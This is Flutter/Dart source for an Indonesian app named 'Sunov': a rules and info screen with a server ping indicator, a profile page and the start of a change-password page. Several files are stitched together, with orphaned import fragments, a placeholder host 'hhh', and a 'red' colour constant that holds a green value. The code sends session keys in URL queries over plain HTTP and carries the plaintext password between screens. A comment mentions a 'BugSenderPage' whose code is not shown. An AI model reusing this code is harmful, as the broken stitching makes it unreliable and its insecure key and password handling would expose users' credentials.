        vsync: this, duration: const Duration(milliseconds: 2000))
      ..repeat(reverse: true);
    _sanctionGlow = Tween<double>(begin: 0.2, end: 0.6)
        .animate(CurvedAnimation(parent: _sanctionCtrl, curve: Curves.easeInOut));

    _fetchServerInfo();
    _startPingLoop();
  }

  @override
  void dispose() {
    _pingTimer?.cancel();
    _bgCtrl.dispose();
    _entranceCtrl.dispose();
    _pingDotCtrl.dispose();
    _sanctionCtrl.dispose();
    super.dispose();
  }

  // ─── API ────────────────────────────────────────────────────────────────────
  Future<void> _fetchServerInfo() async {
    try {
      final res = await http.get(Uri.parse(
          'http://hhh:2836/getServerInfo?key=${widget.sessionKey}'));
      if (res.statusCode == 200 && mounted) {
        setState(() { serverInfo = jsonDecode(res.body); isLoading = false; });
      }
    } catch (_) {
      if (mounted) setState(() => isLoading = false);
    }
    if (mounted) _entranceCtrl.forward();
  }

  void _startPingLoop() {
    _checkPing();
    _pingTimer = Timer.periodic(const Duration(seconds: 5), (_) => _checkPing());
  }

  Future<void> _checkPing() async {
    final start = DateTime.now();
    try {
      final res = await http.get(Uri.parse(
              'http://papi.queen-official.com:2836/ping?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 3));
      final ms = DateTime.now().difference(start).inMilliseconds;
      if (res.statusCode == 200 && mounted) {
        setState(() {
          _apiOnline  = true;
          _pingMs     = ms;
          _pingStatus = '${ms}ms';
        });
      }
    } catch (_) {
      if (mounted) setState(() { _apiOnline = false; _pingMs = 0; _pingStatus = 'Offline'; });
    }
  }

  Color get _pingColor {
    if (!_apiOnline) return _C.red;
    if (_pingMs < 200) return _C.green;
    if (_pingMs < 500) return _C.amber;
    return const Color(0xFFF97316);
  }

  String get _pingLabel {
    if (!_apiOnline) return 'OFFLINE';
    if (_pingMs < 200) return 'EXCELLENT';
    if (_pingMs < 500) return 'GOOD';
    return 'SLOW';
  }

  // ─── Build ────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    if (isLoading) {
      return Scaffold(
        backgroundColor: _C.bg,
        body: Stack(children: [
          Positioned.fill(child: _AnimatedBg(controller: _bgCtrl)),
          const Center(child: _DotsLoader()),
        ]),
      );
    }

    return Scaffold(
      backgroundColor: _C.bg,
      extendBodyBehindAppBar: true,
      appBar: _buildAppBar(),
      body: Stack(
        children: [
          Positioned.fill(child: _AnimatedBg(controller: _bgCtrl)),
          SafeArea(
            child: FadeTransition(
              opacity: _entrance,
              child: ListView(
                physics: const BouncingScrollPhysics(),
                padding: const EdgeInsets.fromLTRB(16, 8, 16, 48),
                children: [
                  // API Status
                  _buildStatusCard(),
                  const SizedBox(height: 20),

                  // Rules header
                  _buildSectionHeader(
                    icon: Icons.gavel_rounded,
                    title: 'Peraturan Pengguna',
                    subtitle: '${_rules.length} aturan berlaku',
                  ),
                  const SizedBox(height: 14),

                  // Rules list
                  ..._rules.asMap().entries.map((e) =>
                    _StaggerItem(
                      index: e.key,
                      child: Padding(
                        padding: const EdgeInsets.only(bottom: 12),
                        child: _RuleCard(rule: e.value, number: e.key + 1),
                      ),
                    )),

                  const SizedBox(height: 20),

                  // Sanction card
                  _buildSanctionCard(),
                  const SizedBox(height: 24),

                  // Footer note
                  _buildFooter(),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  PreferredSizeWidget _buildAppBar() {
    return AppBar(
      backgroundColor: Colors.transparent,
      elevation: 0,
      automaticallyImplyLeading: false,
      centerTitle: true,
      title: Row(mainAxisSize: MainAxisSize.min, children: [
        Container(
          padding: const EdgeInsets.all(6),
          decoration: BoxDecoration(
            color: _C.blue.withOpacity(0.12),
            borderRadius: BorderRadius.circular(8),
          ),
          child: const Icon(Icons.info_outline_rounded,
              color: _C.blueLight, size: 15),
        ),
        const SizedBox(width: 9),
        const Text('Peraturan & Info',
            style: TextStyle(color: _C.text, fontSize: 17,
                fontWeight: FontWeight.w700, letterSpacing: -0.3)),
      ]),
    );
  }

  // ─── Status Card ──────────────────────────────────────────────────────────
  Widget _buildStatusCard() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(18),
        border: Border.all(color: _C.border),
        boxShadow: [
          BoxShadow(color: _pingColor.withOpacity(0.06),
              blurRadius: 20, offset: const Offset(0, 6)),
        ],
      ),
      child: Column(children: [
        // Header
        Row(children: [
          Container(
            width: 36, height: 36,
            decoration: BoxDecoration(
              color: _pingColor.withOpacity(0.1),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: _pingColor.withOpacity(0.25)),
            ),
            child: Icon(Icons.router_rounded, color: _pingColor, size: 17),
          ),
          const SizedBox(width: 12),
          const Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Text('System Status', style: TextStyle(color: _C.text,
                fontSize: 14, fontWeight: FontWeight.w700)),
            Text('Real-time server monitoring',
                style: TextStyle(color: _C.textSub, fontSize: 11)),
          ]),
          const Spacer(),
          // Ping badge
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
            decoration: BoxDecoration(
              color: _pingColor.withOpacity(0.1),
              borderRadius: BorderRadius.circular(8),
              border: Border.all(color: _pingColor.withOpacity(0.3)),
            ),
            child: Text(_pingLabel,
                style: TextStyle(color: _pingColor, fontSize: 10,
                    fontWeight: FontWeight.w800, letterSpacing: 0.8)),
          ),
        ]),

        const SizedBox(height: 16),
        Container(height: 1, color: _C.border),
        const SizedBox(height: 16),

        // Status row
        Row(children: [
          // Dot
          AnimatedBuilder(
            animation: _pingDot,
            builder: (_, __) => Container(
              width: 10, height: 10,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: _apiOnline
                    ? _C.green.withOpacity(_pingDot.value)
                    : _C.red,
                boxShadow: _apiOnline
                    ? [BoxShadow(
                        color: _C.green.withOpacity(_pingDot.value * 0.5),
                        blurRadius: 8)]
                    : null,
              ),
            ),
          ),
          const SizedBox(width: 10),
          Text(
            _apiOnline ? 'API Server Online' : 'API Server Offline',
            style: TextStyle(
              color: _apiOnline ? _C.text : _C.red,
              fontSize: 13,
              fontWeight: FontWeight.w600,
            ),
          ),
          const Spacer(),
          if (_apiOnline) ...[
            const Icon(Icons.speed_rounded, color: _C.textSub, size: 14),
            const SizedBox(width: 5),
            Text(_pingStatus,
                style: TextStyle(color: _pingColor, fontSize: 13,
                    fontWeight: FontWeight.w700)),
          ],
        ]),

        if (_apiOnline) ...[
          const SizedBox(height: 10),
          // Ping bar
          _PingBar(ms: _pingMs, color: _pingColor),
        ],
      ]),
    );
  }

  Widget _buildSectionHeader({
    required IconData icon,
    required String title,
    required String subtitle,
  }) {
    return Row(children: [
      Container(
        width: 4, height: 20,
        decoration: BoxDecoration(
          gradient: _C.btnGrad,
          borderRadius: BorderRadius.circular(2),
        ),
      ),
      const SizedBox(width: 12),
      Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Text(title, style: const TextStyle(color: _C.text, fontSize: 15,
            fontWeight: FontWeight.w700)),
        Text(subtitle, style: const TextStyle(color: _C.textSub, fontSize: 11)),
      ]),
      const Spacer(),
      Icon(icon, color: _C.textSub, size: 18),
    ]);
  }

  // ─── Sanction Card ────────────────────────────────────────────────────────
  Widget _buildSanctionCard() {
    return AnimatedBuilder(
      animation: _sanctionCtrl,
      builder: (_, __) => Container(
        decoration: BoxDecoration(
          color: _C.card,
          borderRadius: BorderRadius.circular(20),
          border: Border.all(
            color: _C.red.withOpacity(0.3 + _sanctionGlow.value * 0.2),
            width: 1.5,
          ),
          boxShadow: [
            BoxShadow(
              color: _C.red.withOpacity(_sanctionGlow.value * 0.15),
              blurRadius: 30,
              spreadRadius: 0,
            ),
          ],
        ),
        child: ClipRRect(
          borderRadius: BorderRadius.circular(20),
          child: Column(children: [
            // Header stripe
            Container(
              height: 3,
              decoration: const BoxDecoration(
                gradient: LinearGradient(
                  colors: [
                    Colors.transparent,
                    Color(0xFFEF4444),
                    Colors.transparent,
                  ],
                ),
              ),
            ),

            Padding(
              padding: const EdgeInsets.all(22),
              child: Column(children: [
                // Icon
                Container(
                  width: 60, height: 60,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: _C.red.withOpacity(0.1),
                    border: Border.all(
                      color: _C.red.withOpacity(0.3 + _sanctionGlow.value * 0.2),
                    ),
                    boxShadow: [
                      BoxShadow(
                        color: _C.red.withOpacity(_sanctionGlow.value * 0.3),
                        blurRadius: 20,
                      ),
                    ],
                  ),
                  child: Icon(Icons.gavel_rounded,
                      color: _C.red.withOpacity(0.8 + _sanctionGlow.value * 0.2),
                      size: 28),
                ),
                const SizedBox(height: 14),
                const Text('SANKSI',
                    style: TextStyle(color: _C.red, fontSize: 20,
                        fontWeight: FontWeight.w900, letterSpacing: 2)),
                const SizedBox(height: 10),

                Container(
                  padding: const EdgeInsets.all(14),
                  decoration: BoxDecoration(
                    color: _C.surface,
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: _C.border),
                  ),
                  child: Column(children: [
                    const Text(
                      'Jika pengguna terbukti melanggar salah satu peraturan di atas:',
                      textAlign: TextAlign.center,
                      style: TextStyle(color: _C.textSub, fontSize: 12, height: 1.5),
                    ),
                    const SizedBox(height: 12),
                    Container(
                      padding: const EdgeInsets.symmetric(
                          horizontal: 16, vertical: 10),
                      decoration: BoxDecoration(
                        color: _C.red.withOpacity(0.08),
                        borderRadius: BorderRadius.circular(10),
                        border: Border.all(color: _C.red.withOpacity(0.25)),
                      ),
                      child: const Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(Icons.block_rounded, color: _C.red, size: 16),
                          SizedBox(width: 8),
                          Text('Akun DIHAPUS secara permanen',
                              style: TextStyle(color: _C.text, fontSize: 13,
                                  fontWeight: FontWeight.w700)),
                        ],
                      ),
                    ),
                    const SizedBox(height: 10),
                    const Text(
                      'Tanpa pengembalian akun, saldo, atau kompensasi apa pun.',
                      textAlign: TextAlign.center,
                      style: TextStyle(color: _C.textSub, fontSize: 12,
                          height: 1.4),
                    ),
                  ]),
                ),
              ]),
            ),
          ]),
        ),
      ),
    );
  }

  Widget _buildFooter() {
    return Column(children: [
      Container(
        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
        decoration: BoxDecoration(
          color: _C.surface,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: _C.border),
        ),
        child: Row(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Icon(Icons.shield_moon_rounded,
                color: _C.blueLight, size: 18),
            const SizedBox(width: 12),
            const Expanded(
              child: Text(
                'Peraturan ini dibuat untuk menjaga keamanan, kenyamanan, dan '
                'kestabilan ekosistem Sunov App. Dengan menggunakan '
                'aplikasi ini, pengguna dianggap telah menyetujui seluruh '
                'peraturan di atas.',
                style: TextStyle(color: _C.textSub, fontSize: 12, height: 1.6,
                    fontStyle: FontStyle.italic),
              ),
            ),
          ],
        ),
      ),
      const SizedBox(height: 16),
      Row(mainAxisAlignment: MainAxisAlignment.center, children: [
        Container(
          height: 3, width: 40,
          decoration: BoxDecoration(
            gradient: _C.btnGrad,
            borderRadius: BorderRadius.circular(2),
          ),
        ),
        const SizedBox(width: 10),
        const Text('Sunov',
            style: TextStyle(color: _C.textDim, fontSize: 11,
                fontWeight: FontWeight.w600, letterSpacing: 0.5)),
        const SizedBox(width: 10),
        Container(
          height: 3, width: 40,
          decoration: BoxDecoration(
            gradient: _C.btnGrad,
            borderRadius: BorderRadius.circular(2),
          ),
        ),
      ]),
    ]);
  }
}

// ─── Rule Card ────────────────────────────────────────────────────────────────
class _RuleCard extends StatefulWidget {
  final _Rule rule;
  final int number;
  const _RuleCard({required this.rule, required this.number});

  @override
  State<_RuleCard> createState() => _RuleCardState();
}

class _RuleCardState extends State<_RuleCard> {
  bool _expanded = false;

  @override
  Widget build(BuildContext context) {
    final color = widget.rule.color;

    return GestureDetector(
      onTap: () => setState(() => _expanded = !_expanded),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 250),
        curve: Curves.easeOutCubic,
        decoration: BoxDecoration(
          color: _expanded ? color.withOpacity(0.05) : _C.card,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(
            color: _expanded ? color.withOpacity(0.3) : _C.border,
            width: _expanded ? 1.5 : 1.0,
          ),
          boxShadow: _expanded
              ? [BoxShadow(color: color.withOpacity(0.08), blurRadius: 16,
                  offset: const Offset(0, 4))]
              : [],
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Padding(
              padding: const EdgeInsets.all(14),
              child: Row(children: [
                // Icon container
                AnimatedContainer(
                  duration: const Duration(milliseconds: 200),
                  width: 40, height: 40,
                  decoration: BoxDecoration(
                    color: color.withOpacity(_expanded ? 0.15 : 0.08),
                    borderRadius: BorderRadius.circular(11),
                    border: Border.all(
                        color: color.withOpacity(_expanded ? 0.35 : 0.15)),
                  ),
                  child: Icon(widget.rule.icon, color: color, size: 18),
                ),
                const SizedBox(width: 12),
                // Title + badge
                Expanded(child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Row(children: [
                      Container(
                        padding: const EdgeInsets.symmetric(
                            horizontal: 6, vertical: 2),
                        decoration: BoxDecoration(
                          color: color.withOpacity(0.1),
                          borderRadius: BorderRadius.circular(5),
                          border: Border.all(color: color.withOpacity(0.25)),
                        ),
                        child: Text('Rule ${widget.number}',
                            style: TextStyle(color: color, fontSize: 9,
                                fontWeight: FontWeight.w800, letterSpacing: 0.5)),
                      ),
                    ]),
                    const SizedBox(height: 4),
                    Text(widget.rule.title,
                        style: const TextStyle(color: _C.text, fontSize: 13,
                            fontWeight: FontWeight.w700, height: 1.2)),
                  ],
                )),
                // Chevron
                AnimatedRotation(
                  turns: _expanded ? 0.5 : 0,
                  duration: const Duration(milliseconds: 220),
                  child: const Icon(Icons.keyboard_arrow_down_rounded,
                      color: _C.textDim, size: 20),
                ),
              ]),
            ),

            // Expanded desc
            AnimatedCrossFade(
              firstChild: const SizedBox(width: double.infinity),
              secondChild: Padding(
                padding: const EdgeInsets.fromLTRB(14, 0, 14, 14),
                child: Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: _C.surface,
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: _C.border),
                  ),
                  child: Text(widget.rule.desc,
                      style: const TextStyle(color: _C.textSub, fontSize: 13,
                          height: 1.6)),
                ),
              ),
              crossFadeState: _expanded
                  ? CrossFadeState.showSecond
                  : CrossFadeState.showFirst,
              duration: const Duration(milliseconds: 250),
            ),
          ],
        ),
      ),
    );
  }
}

// ─── Ping Bar ─────────────────────────────────────────────────────────────────
class _PingBar extends StatelessWidget {
  final int ms;
  final Color color;
  const _PingBar({required this.ms, required this.color});

  @override
  Widget build(BuildContext context) {
    final pct = (ms / 1000).clamp(0.0, 1.0);
    return Row(children: [
      const Text('Latency', style: TextStyle(color: _C.textDim, fontSize: 10)),
      const SizedBox(width: 8),
      Expanded(
        child: ClipRRect(
          borderRadius: BorderRadius.circular(3),
          child: Stack(children: [
            Container(height: 4, color: _C.border),
            AnimatedContainer(
              duration: const Duration(milliseconds: 500),
              height: 4,
              width: (MediaQuery.of(context).size.width - 80) * pct,
              decoration: BoxDecoration(
                color: color,
                borderRadius: BorderRadius.circular(3),
                boxShadow: [
                  BoxShadow(color: color.withOpacity(0.4), blurRadius: 6),
                ],
              ),
            ),
          ]),
        ),
      ),
      const SizedBox(width: 8),
      Text('${ms}ms', style: TextStyle(color: color, fontSize: 10,
          fontWeight: FontWeight.w700)),
    ]);
  }
}

// ─── Stagger Item ─────────────────────────────────────────────────────────────
class _StaggerItem extends StatelessWidget {
  final int index;
  final Widget child;
  const _StaggerItem({required this.index, required this.child});

  @override
  Widget build(BuildContext context) {
    return TweenAnimationBuilder<double>(
      tween: Tween(begin: 0, end: 1),
      duration: Duration(milliseconds: 400 + (index * 80).clamp(0, 500)),
      curve: Curves.easeOutCubic,
      builder: (_, v, ch) => Opacity(
        opacity: v,
        child: Transform.translate(offset: Offset(0, 16 * (1 - v)), child: ch),
      ),
      child: child,
    );
  }
}

// ─── Dots Loader ──────────────────────────────────────────────────────────────
class _DotsLoader extends StatefulWidget {
  const _DotsLoader();

  @override
  State<_DotsLoader> createState() => _DotsLoaderState();
}

class _DotsLoaderState extends State<_DotsLoader>
    with SingleTickerProviderStateMixin {
  late AnimationController _c;

  @override
  void initState() {
    super.initState();
    _c = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 900))
      ..repeat();
  }

  @override
  void dispose() { _c.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: _c,
      builder: (_, __) => Row(
        mainAxisSize: MainAxisSize.min,
        children: List.generate(3, (i) {
          final t = ((_c.value - i / 3) % 1.0).clamp(0.0, 1.0);
          final s = math.sin(t * math.pi);
          return Padding(
            padding: const EdgeInsets.symmetric(horizontal: 4),
            child: Transform.scale(
              scale: 0.4 + s * 0.6,
              child: Container(
                width: 9, height: 9,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: _C.blueMid.withOpacity(0.4 + s * 0.6),
                ),
              ),
            ),
          );
        }),
      ),
    );
  }
}

// ─── Animated Background ──────────────────────────────────────────────────────
class _AnimatedBg extends StatelessWidget {
  final AnimationController controller;
  const _AnimatedBg({required this.controller});

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: controller,
      builder: (_, __) =>
          CustomPaint(painter: _BgPainter(controller.value)),
    );
  }
}

class _BgPainter extends CustomPainter {
  final double t;
  _BgPainter(this.t);

  @override
  void paint(Canvas canvas, Size size) {
    final grid = Paint()
      ..color = _C.border.withOpacity(0.25)
      ..strokeWidth = 0.5;
    const step = 38.0;
    for (double x = 0; x < size.width; x += step) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), grid);
    }
    for (double y = 0; y < size.height; y += step) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), grid);
    }
    final glow = Paint()
      ..shader = RadialGradient(colors: [
        _C.blue.withOpacity(0.08 + math.sin(t * math.pi * 2) * 0.02),
        Colors.transparent,
      ], radius: 0.85).createShader(Rect.fromCircle(
          center: Offset(size.width / 2, size.height * 0.18),
          radius: size.width * 0.65));
    canvas.drawCircle(
        Offset(size.width / 2, size.height * 0.18), size.width * 0.65, glow);
  }

  @override
  bool shouldRepaint(_BgPainter old) => old.t != t;
}









class ProfilePage extends StatefulWidget {
  final String username;
  final String password;
  final String role;
  final String expiredDate;
  final String sessionKey;

  const ProfilePage({
    super.key,
    required this.username,
    required this.password,
    required this.role,
    required this.expiredDate,
    required this.sessionKey,
  });

  @override
  State<ProfilePage> createState() => _ProfilePageState();
}

class _ProfilePageState extends State<ProfilePage> {
  File? _profileImage;
  final ImagePicker _picker = ImagePicker();

  // --- TEMA WARNA CYAN ---
  final Color bgDark = const Color(0xFF0B1A1A);
  final Color primaryCyan = const Color(0xFF00ACC1);
  final Color accentCyan = const Color(0xFF18FFFF);
  final Color primaryWhite = Colors.white;

  final Color cardGlass = Colors.white.withOpacity(0.05);
  final Color borderGlass = Colors.white.withOpacity(0.1);

  @override
  void initState() {
    super.initState();
    _loadProfileImage();
  }

  Future<void> _loadProfileImage() async {
    final prefs = await SharedPreferences.getInstance();
    final imagePath = prefs.getString('profile_image_${widget.username}');
    if (imagePath != null && imagePath.isNotEmpty) {
      setState(() {
        _profileImage = File(imagePath);
      });
    }
  }

  String _censorText(String text, {bool isPassword = false}) {
    if (text.isEmpty) return "N/A";
    if (isPassword) {
      return "••••••••";
    }
    if (text.length <= 2) return "${text.substring(0, 1)}••";
    return "${text.substring(0, 2)}${'•' * (text.length - 2)}";
  }

  Future<void> _showImageSourceDialog() {
    return showModalBottomSheet(
      context: context,
      backgroundColor: bgDark,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
      ),
      builder: (context) => SafeArea(
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            ListTile(
              leading: const Icon(Icons.camera_alt, color: Color(0xFF00ACC1)),
              title: const Text("Kamera", style: TextStyle(color: Colors.white)),
              onTap: () {
                Navigator.pop(context);
                _pickImage(ImageSource.camera);
              },
            ),
            ListTile(
              leading: const Icon(Icons.photo_library, color: Color(0xFF18FFFF)),
              title: const Text("Galeri", style: TextStyle(color: Colors.white)),
              onTap: () {
                Navigator.pop(context);
                _pickImage(ImageSource.gallery);
              },
            ),
          ],
        ),
      ),
    );
  }

  Future<void> _pickImage(ImageSource source) async {
    try {
      final XFile? pickedFile = await _picker.pickImage(
        source: source,
        imageQuality: 70,
      );

      if (pickedFile != null) {
        final File imageFile = File(pickedFile.path);

        final prefs = await SharedPreferences.getInstance();
        await prefs.setString('profile_image_${widget.username}', imageFile.path);

        setState(() {
          _profileImage = imageFile;
        });
      }
    } catch (e) {
      print("Error picking image: $e");
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgDark,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: IconButton(
          icon: Icon(Icons.arrow_back_ios_new, color: accentCyan),
          onPressed: () => Navigator.pop(context),
        ),
        title: const Text(
          "My Profile",
          style: TextStyle(
            color: Colors.white,
            fontWeight: FontWeight.bold,
          ),
        ),
        centerTitle: true,
      ),
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [
              bgDark,
              primaryCyan.withOpacity(0.1),
              bgDark,
            ],
          ),
        ),
        child: SingleChildScrollView(
          padding: const EdgeInsets.all(20),
          child: Column(
            children: [
              const SizedBox(height: 20),

              Center(
                child: GestureDetector(
                  onTap: _showImageSourceDialog,
                  child: Stack(
                    children: [
                      Container(
                        width: 120,
                        height: 120,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          gradient: LinearGradient(
                            colors: [primaryCyan, accentCyan],
                          ),
                          boxShadow: [
                            BoxShadow(
                              color: primaryCyan.withOpacity(0.5),
                              blurRadius: 20,
                              spreadRadius: 2,
                            )
                          ],
                        ),
                        child: ClipOval(
                          child: _profileImage != null
                              ? Image.file(
                            _profileImage!,
                            fit: BoxFit.cover,
                          )
                              : Icon(
                            FontAwesomeIcons.userAstronaut,
                            size: 50,
                            color: Colors.white.withOpacity(0.8),
                          ),
                        ),
                      ),
                      Positioned(
                        bottom: 0,
                        right: 0,
                        child: Container(
                          padding: const EdgeInsets.all(8),
                          decoration: BoxDecoration(
                            color: accentCyan,
                            shape: BoxShape.circle,
                            border: Border.all(color: bgDark, width: 3),
                          ),
                          child: const Icon(Icons.camera_alt, size: 18, color: Colors.white),
                        ),
                      ),
                    ],
                  ),
                ),
              ),
              const SizedBox(height: 15),
              Text(
                widget.username,
                style: const TextStyle(
                  color: Colors.white,
                  fontSize: 24,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'Orbitron',
                ),
              ),
              Text(
                widget.role.toUpperCase(),
                style: TextStyle(
                  color: accentCyan,
                  fontSize: 14,
                  fontWeight: FontWeight.w600,
                  letterSpacing: 1.5,
                ),
              ),

              const SizedBox(height: 30),

              Row(
                children: [
                  Expanded(
                    child: _buildInfoCard(
                      icon: Icons.person_outline,
                      label: "Username",
                      value: _censorText(widget.username),
                    ),
                  ),
                  const SizedBox(width: 15),
                  Expanded(
                    child: _buildInfoCard(
                      icon: Icons.lock_outline,
                      label: "Password",
                      value: _censorText(widget.password, isPassword: true),
                    ),
                  ),
                ],
              ),

              const SizedBox(height: 15),

              Row(
                children: [
                  Expanded(
                    child: _buildInfoCard(
                      icon: Icons.verified_user_outlined,
                      label: "Role",
                      value: widget.role.toUpperCase(),
                    ),
                  ),
                  const SizedBox(width: 15),
                  Expanded(
                    child: _buildInfoCard(
                      icon: Icons.calendar_today_outlined,
                      label: "Expired",
                      value: widget.expiredDate,
                    ),
                  ),
                ],
              ),

              const SizedBox(height: 15),

              _buildInfoCard(
                icon: Icons.vpn_key,
                label: "Session Key",
                value: "${widget.sessionKey.substring(0, 8)}...",
              ),

              const SizedBox(height: 40),

              SizedBox(
                width: double.infinity,
                height: 55,
                child: ElevatedButton.icon(
                  icon: const Icon(Icons.lock_reset, color: Colors.white),
                  label: const Text(
                    "CHANGE PASSWORD",
                    style: TextStyle(
                      color: Colors.white,
                      fontSize: 16,
                      fontWeight: FontWeight.bold,
                      letterSpacing: 1,
                    ),
                  ),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: primaryCyan,
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
                    elevation: 5,
                    shadowColor: primaryCyan.withOpacity(0.5),
                  ),
                  onPressed: () {
                    Navigator.push(
                      context,
                      MaterialPageRoute(
                        builder: (_) => ChangePasswordPage(
                          username: widget.username,
                          sessionKey: widget.sessionKey,
                        ),
                      ),
                    );
                  },
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildInfoCard({required IconData icon, required String label, required String value}) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 15, vertical: 15),
      decoration: BoxDecoration(
        color: cardGlass,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: borderGlass),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(6),
                decoration: BoxDecoration(
                  color: primaryCyan.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Icon(icon, color: accentCyan, size: 16),
              ),
              const SizedBox(width: 10),
              Expanded(
                child: Text(
                  label,
                  style: TextStyle(
                    color: Colors.grey.shade400,
                    fontSize: 11,
                    fontWeight: FontWeight.w600,
                  ),
                  overflow: TextOverflow.ellipsis,
                ),
              ),
            ],
          ),
          const SizedBox(height: 8),
          Text(
            value,
            style: const TextStyle(
              color: Colors.white,
              fontSize: 14,
              fontWeight: FontWeight.bold,
              fontFamily: 'ShareTechMono',
            ),
            overflow: TextOverflow.ellipsis,
            maxLines: 1,
          ),
        ],
      ),
    );
  }
}

as math;

as http;


const String baseUrl = "http://papi.queen-official.com:2836";

// ─── Palette (sama dengan BugSenderPage & AdminPage) ─────────────────────────
class _C {
  static const bg       = Color(0xFF060B14);
  static const surface  = Color(0xFF0C1424);
  static const card     = Color(0xFF101A2E);
  static const border   = Color(0xFF1A2D4A);
  static const borderLit= Color(0xFF1E3A5F);

  static const blue     = Color(0xFF1B6FBD);
  static const blueMid  = Color(0xFF2D8FE8);
  static const blueLight= Color(0xFF56AEF5);
  static const blueFrost= Color(0xFF90CEF7);

  static const green    = Color(0xFF22C55E);
  static const red      = Color(0xFF4CAF50);

  static const text     = Color(0xFFE2EDF9);
  static const textSub  = Color(0xFF7A9BBF);
  static const textDim  = Color(0xFF3A5470);

  static const LinearGradient btnGrad = LinearGradient(
    colors: [blueMid, blueLight],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
}

class ChangePasswordPage extends StatefulWidget {
  final String username;
  final String sessionKey;

  const ChangePasswordPage({
    super.key,
    required this.username,
    required this.sessionKey,
  });

  @override
  State<ChangePasswordPage> createState() => _ChangePasswordPageState();
}

class _ChangePasswordPageState extends State<ChangePasswordPage>
    with TickerProviderStateMixin {
  final oldPassCtrl     = TextEditingController();
  final newPassCtrl     = TextEditingController();
  final confirmPassCtrl = TextEditingController();

  bool isLoading       = false;
  bool _obscureOld     = true;
  bool _obscureNew     = true;
  bool _obscureConfirm = true;

  // Strength meter
  double _strength = 0;
  String _strengthLabel = '';
  Color  _strengthColor = _C.textDim;

  // Animations
  late AnimationController _bgCtrl;
  late AnimationController _entranceCtrl;
  late AnimationController _iconCtrl;
  late AnimationController _shakeCtrl;

  late Animation<double>  _iconRotate;
  late Animation<double>  _iconScale;
  late Animation<Offset>  _formSlide;
  late Animation<double>  _formFade;
  late Animation<double>  _shake;

  // Field focus nodes
  final _oldFocus     = FocusNode();
  final _newFocus     = FocusNode();
  final _confirmFocus = FocusNode();

  @override
  void initState() {
    super.initState();

    _bgCtrl = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 20),
    )..repeat();

    _entranceCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 900),
    );
    _formSlide = Tween<Offset>(begin: const Offset(0, 0.06), end: Offset.zero)
        .animate(CurvedAnimation(parent: _entranceCtrl, curve: Curves.easeOutCubic));
    _formFade = CurvedAnimation(parent: _entranceCtrl, curve: Curves.easeOut);

    _iconCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1200),
    );
    _iconRotate = Tween<double>(begin: -0.15, end: 0.0)
        .animate(CurvedAnimation(parent: _iconCtrl, curve: Curves.elasticOut));
    _iconScale = Tween<double>(begin: 0.4, end: 1.0)
        .animate(CurvedAnimation(parent: _iconCtrl, curve: Curves.easeOutBack));

    _shakeCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 500),
    );
    _shake = TweenSequence<double>([
      TweenSequenceItem(tween: Tween(begin: 0.0, end: -10.0), weight: 1),
      TweenSequenceItem(tween: Tween(begin: -10.0, end: 10.0), weight: 2),
      TweenSequenceItem(tween: Tween(begin: 10.0, end: -8.0),  weight: 2),
      TweenSequenceItem(tween: Tween(begin: -8.0, end: 8.0),   weight: 2),
      TweenSequenceItem(tween: Tween(begin: 8.0, end: 0.0),    weight: 1),
    ]).animate(CurvedAnimation(parent: _shakeCtrl, curve: Curves.easeInOut));

    _entranceCtrl.forward();
    _iconCtrl.forward();

    newPassCtrl.addListener(_evalStrength);
  }

  @override
  void dispose() {
    _bgCtrl.dispose();
    _entranceCtrl.dispose();
    _iconCtrl.dispose();
    _shakeCtrl.dispose();
    oldPassCtrl.dispose();
    newPassCtrl.dispose();
